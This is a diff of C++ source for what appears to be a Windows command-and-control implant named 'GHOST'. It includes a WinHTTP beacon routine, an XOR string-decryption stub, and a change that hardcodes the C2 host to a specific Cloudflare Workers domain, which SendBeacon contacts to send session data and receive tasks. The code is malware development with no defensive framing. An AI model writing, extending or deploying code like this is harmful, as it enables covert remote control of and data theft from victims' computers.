@@ -12,7 +12,7 @@
 #pragma comment(lib, "winhttp.lib")
 
 // =====================================================================
-//  DEBUG LOGGING – now accepts wstring (calls .c_str())
+//  DEBUG LOGGING – overloads for wstring and string
 // =====================================================================
 static void DebugLog(const wchar_t* msg) {
     OutputDebugStringW(L"[GHOST] ");
@@ -24,17 +24,15 @@ static void DebugLog(const char* msg) {
     OutputDebugStringA(msg);
     OutputDebugStringA("\n");
 }
-// Overload for std::wstring
 static void DebugLog(const std::wstring& msg) {
     DebugLog(msg.c_str());
 }
-// Overload for std::string
 static void DebugLog(const std::string& msg) {
     DebugLog(msg.c_str());
 }
 
 // =====================================================================
-//  JSON HELPERS (unchanged)
+//  JSON HELPERS (minimal, no external deps)
 // =====================================================================
 static std::string JsonEscape(const std::string& s) {
     std::string out;
@@ -83,10 +81,10 @@ static std::string JsonGetString(const std::string& json, const std::string& key
 }
 
 // =====================================================================
-//  XOR DECRYPTION (kept but not used – for reference)
+//  XOR DECRYPTION (kept but not used – we hardcode the domain)
 // =====================================================================
 std::wstring DecryptString(const uint8_t* enc, size_t len, const std::wstring& key) {
-    // Not used – we hardcode the domain
+    // Not used – we bypass decryption
     return L"";
 }
 
@@ -294,9 +292,9 @@ static std::string BuildBeaconJson(const Session& s) {
     return j.str();
 }
 
-// Resolve C2 host – hardcoded to your worker
+// Resolve C2 host – hardcoded to your Cloudflare Worker domain
 static std::wstring GetC2Host() {
-    return std::wstring(config::C2_DOMAIN);
+    return L"ghost-c2.sujallamichhane.workers.dev";
 }
 
 BOOL SendBeacon(const Session& session, std::wstring& taskOut) {
